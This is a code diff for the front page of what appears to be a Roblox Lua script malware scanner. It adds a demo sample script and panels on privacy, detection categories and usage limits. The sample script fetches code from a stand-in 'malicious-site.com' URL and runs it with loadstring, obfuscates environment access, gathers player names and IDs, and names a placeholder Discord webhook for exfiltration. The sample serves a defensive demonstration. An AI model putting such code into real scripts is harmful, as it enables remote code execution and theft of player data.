@@ -11,9 +11,41 @@ import { ProfileModal } from '@/components/profile-modal';
 import { CustomModal, useModal } from '@/components/custom-modal';
 import { ScanningAnimation } from '@/components/scanning-animation';
 import { ScanReport } from '@/types';
-import { Shield, Github, Users, User, LogOut, Trophy } from 'lucide-react';
+import { Shield, Github, Users, User, LogOut, Trophy, Play, ShieldCheck, Lock, Server, MessageSquare, AlertTriangle, CheckCircle, FileSearch, Globe, Binary, Eye, Code2, Database, Timer, Layers } from 'lucide-react';
 
-type ViewMode = 'scan' | 'community';
+const SAMPLE_SCRIPT = `-- Example Lua Script for Demo
+local function suspiciousFunction()
+    -- Attempting to access external resource
+    local url = "https://malicious-site.com/steal"
+    local data = game:HttpGet(url)
+    
+    -- Loading remote code (dangerous)
+    local remoteCode = loadstring(data)
+    if remoteCode then
+        remoteCode()
+    end
+end
+
+-- Obfuscated variable names
+local _a = getfenv()
+local _b = _a["game"]
+local _c = _b["Players"]
+
+-- Webhook exfiltration
+local webhook = "discord.com/api/webhooks/123456/token"
+local playerData = {}
+
+for _, player in ipairs(_c:GetPlayers()) do
+    table.insert(playerData, {
+        name = player.Name,
+        id = player.UserId,
+        ip = tostring(player)
+    })
+end
+
+-- Send to external server
+local jsonData = game:GetService("HttpService"):JSONEncode(playerData)
+suspiciousFunction()`;
 
 interface User {
   id: string;
@@ -223,18 +255,120 @@ const styles = {
     textAlign: 'center' as const,
     marginTop: '16px',
   },
-  loginPromptButton: {
-    padding: '8px 16px',
+  sampleButton: {
+    display: 'flex',
+    alignItems: 'center',
+    gap: '8px',
+    padding: '12px 20px',
     borderRadius: '6px',
-    backgroundColor: 'rgba(59, 130, 246, 0.2)',
-    border: '1px solid rgba(59, 130, 246, 0.3)',
-    color: '#3b82f6',
+    backgroundColor: 'rgba(34, 197, 94, 0.1)',
+    border: '1px solid rgba(34, 197, 94, 0.2)',
+    color: '#22c55e',
+    fontSize: '14px',
+    fontWeight: 500,
+    cursor: 'pointer',
+    marginTop: '16px',
+    transition: 'all 0.2s',
+  },
+  infoSection: {
+    marginTop: '32px',
+    padding: '24px',
+    backgroundColor: 'rgba(255, 255, 255, 0.02)',
+    borderRadius: '8px',
+    border: '1px solid rgba(255, 255, 255, 0.06)',
+  },
+  infoTitle: {
+    fontSize: '16px',
+    fontWeight: 600,
+    color: '#ffffff',
+    marginBottom: '16px',
+    display: 'flex',
+    alignItems: 'center',
+    gap: '8px',
+  },
+  infoGrid: {
+    display: 'grid',
+    gridTemplateColumns: 'repeat(auto-fit, minmax(250px, 1fr))',
+    gap: '16px',
+  },
+  infoItem: {
+    display: 'flex',
+    alignItems: 'flex-start',
+    gap: '12px',
+    padding: '12px',
+    backgroundColor: 'rgba(255, 255, 255, 0.03)',
+    borderRadius: '6px',
+  },
+  infoIcon: {
+    width: '32px',
+    height: '32px',
+    borderRadius: '6px',
+    backgroundColor: 'rgba(59, 130, 246, 0.1)',
+    display: 'flex',
+    alignItems: 'center',
+    justifyContent: 'center',
+    flexShrink: 0,
+  },
+  infoText: {
+    fontSize: '13px',
+    color: 'rgba(255, 255, 255, 0.6)',
+    lineHeight: 1.5,
+  },
+  infoLabel: {
+    fontSize: '13px',
+    fontWeight: 600,
+    color: '#ffffff',
+    marginBottom: '4px',
+  },
+  privacyBox: {
+    marginTop: '24px',
+    padding: '16px',
+    backgroundColor: 'rgba(34, 197, 94, 0.05)',
+    borderRadius: '8px',
+    border: '1px solid rgba(34, 197, 94, 0.15)',
+  },
+  privacyTitle: {
     fontSize: '14px',
     fontWeight: 600,
-    cursor: 'pointer',
+    color: '#22c55e',
+    marginBottom: '8px',
+    display: 'flex',
+    alignItems: 'center',
+    gap: '8px',
+  },
+  privacyText: {
+    fontSize: '13px',
+    color: 'rgba(255, 255, 255, 0.6)',
+    lineHeight: 1.5,
+  },
+  limitsBox: {
+    marginTop: '24px',
+    padding: '16px',
+    backgroundColor: 'rgba(245, 158, 11, 0.05)',
+    borderRadius: '8px',
+    border: '1px solid rgba(245, 158, 11, 0.15)',
+  },
+  limitsTitle: {
+    fontSize: '14px',
+    fontWeight: 600,
+    color: '#f59e0b',
+    marginBottom: '8px',
+    display: 'flex',
+    alignItems: 'center',
+    gap: '8px',
+  },
+  discordBadge: {
+    display: 'inline-flex',
+    alignItems: 'center',
+    gap: '6px',
+    padding: '6px 12px',
+    backgroundColor: 'rgba(88, 101, 242, 0.1)',
+    border: '1px solid rgba(88, 101, 242, 0.2)',
+    borderRadius: '4px',
+    fontSize: '12px',
+    color: '#5865f2',
     marginTop: '12px',
   },
-};
 
 export default function Home() {
   const [viewMode, setViewMode] = useState<ViewMode>('scan');
@@ -456,6 +590,10 @@ export default function Home() {
     setSubmissionReport(reportToSubmit);
     setSubmissionModalOpen(true);
   };
+
+  const handleSampleScript = useCallback(async () => {
+    handleCodePaste(SAMPLE_SCRIPT);
+  }, [handleCodePaste]);
 
   const handleSubmitToCommunity = async (details: { scriptName: string; description: string; source?: string; tags: string[] }) => {
     if (!submissionReport || !user) return;
@@ -700,6 +838,15 @@ export default function Home() {
                           onBulkUpload={handleBulkUpload}
                         />
                         
+                        {/* Try with Sample Script Button */}
+                        <button
+                          onClick={handleSampleScript}
+                          style={styles.sampleButton}
+                        >
+                          <Play style={{ width: '16px', height: '16px' }} />
+                          <span>Try with Sample Script</span>
+                        </button>
+                        
                         {error && (
                           <motion.div
                             initial={{ opacity: 0 }}
@@ -714,6 +861,110 @@ export default function Home() {
                   </motion.div>
                 )}
               </AnimatePresence>
+            </div>
+
+            {/* Privacy Statement */}
+            <div style={styles.privacyBox}>
+              <div style={styles.privacyTitle}>
+                <ShieldCheck style={{ width: '18px', height: '18px' }} />
+                <span>Privacy & Security</span>
+              </div>
+              <p style={styles.privacyText}>
+                <strong>Your code is safe.</strong> Analysis happens entirely in-memory on our servers. 
+                Uploaded scripts are never saved to disk or database (unless you explicitly submit to Community). 
+                Files are analyzed immediately and discarded after processing. 
+                We do not store, share, or retain your private scripts.
+              </p>
+            </div>
+
+            {/* What We Detect */}
+            <div style={styles.infoSection}>
+              <div style={styles.infoTitle}>
+                <Eye style={{ width: '20px', height: '20px', color: '#3b82f6' }} />
+                <span>What We Detect</span>
+              </div>
+              <div style={styles.infoGrid}>
+                <div style={styles.infoItem}>
+                  <div style={styles.infoIcon}>
+                    <Globe style={{ width: '18px', height: '18px', color: '#3b82f6' }} />
+                  </div>
+                  <div>
+                    <div style={styles.infoLabel}>Webhook & HTTP Activity</div>
+                    <p style={styles.infoText}>Discord webhooks, HttpGet requests, and external data exfiltration attempts</p>
+                  </div>
+                </div>
+                <div style={styles.infoItem}>
+                  <div style={styles.infoIcon}>
+                    <Code2 style={{ width: '18px', height: '18px', color: '#f59e0b' }} />
+                  </div>
+                  <div>
+                    <div style={styles.infoLabel}>Remote Code Execution</div>
+                    <p style={styles.infoText}>loadstring calls, bytecode loading, and dynamic code execution chains</p>
+                  </div>
+                </div>
+                <div style={styles.infoItem}>
+                  <div style={styles.infoIcon}>
+                    <Database style={{ width: '18px', height: '18px', color: '#22c55e' }} />
+                  </div>
+                  <div>
+                    <div style={styles.infoLabel}>Environment Manipulation</div>
+                    <p style={styles.infoText}>getgenv, getfenv, setfenv, and global environment tampering</p>
+                  </div>
+                </div>
+                <div style={styles.infoItem}>
+                  <div style={styles.infoIcon}>
+                    <Binary style={{ width: '18px', height: '18px', color: '#f97316' }} />
+                  </div>
+                  <div>
+                    <div style={styles.infoLabel}>Bytecode & Encoding</div>
+                    <p style={styles.infoText}>Compiled bytecode detection, base64 encoding, and obfuscation patterns</p>
+                  </div>
+                </div>
+                <div style={styles.infoItem}>
+                  <div style={styles.infoIcon}>
+                    <FileSearch style={{ width: '18px', height: '18px', color: '#8b5cf6' }} />
+                  </div>
+                  <div>
+                    <div style={styles.infoLabel}>Obfuscation Patterns</div>
+                    <p style={styles.infoText}>String concatenation, variable name mangling, and anti-analysis techniques</p>
+                  </div>
+                </div>
+                <div style={styles.infoItem}>
+                  <div style={styles.infoIcon}>
+                    <Lock style={{ width: '18px', height: '18px', color: '#ef4444' }} />
+                  </div>
+                  <div>
+                    <div style={styles.infoLabel}>Player Data Access</div>
+                    <p style={styles.infoText}>Attempts to access player information, UserIds, or sensitive game data</p>
+                  </div>
+                </div>
+              </div>
+            </div>
+
+            {/* Usage Limits */}
+            <div style={styles.limitsBox}>
+              <div style={styles.limitsTitle}>
+                <AlertTriangle style={{ width: '18px', height: '18px' }} />
+                <span>Usage Limits & Technical Constraints</span>
+              </div>
+              <ul style={{ ...styles.privacyText, margin: 0, paddingLeft: '16px' }}>
+                <li>Maximum file size: 500 KB per script</li>
+                <li>Maximum recursion depth: 10 levels for function calls</li>
+                <li>Rate limiting: 10 scans per minute per IP</li>
+                <li>Link following: External includes are not resolved</li>
+                <li>Large scripts may be truncated if they exceed analysis limits</li>
+              </ul>
+            </div>
+
+            {/* Discord Bot Status */}
+            <div style={{ ...styles.limitsBox, backgroundColor: 'rgba(88, 101, 242, 0.05)', border: '1px solid rgba(88, 101, 242, 0.15)' }}>
+              <div style={{ ...styles.limitsTitle, color: '#5865f2' }}>
+                <MessageSquare style={{ width: '18px', height: '18px' }} />
+                <span>Discord Bot Integration</span>
+              </div>
+              <p style={styles.privacyText}>
+                Discord Bot: <strong style={{ color: '#5865f2' }}>Coming Soon</strong> — Scan scripts directly from your Discord server.
+              </p>
             </div>
           </div>
         </>
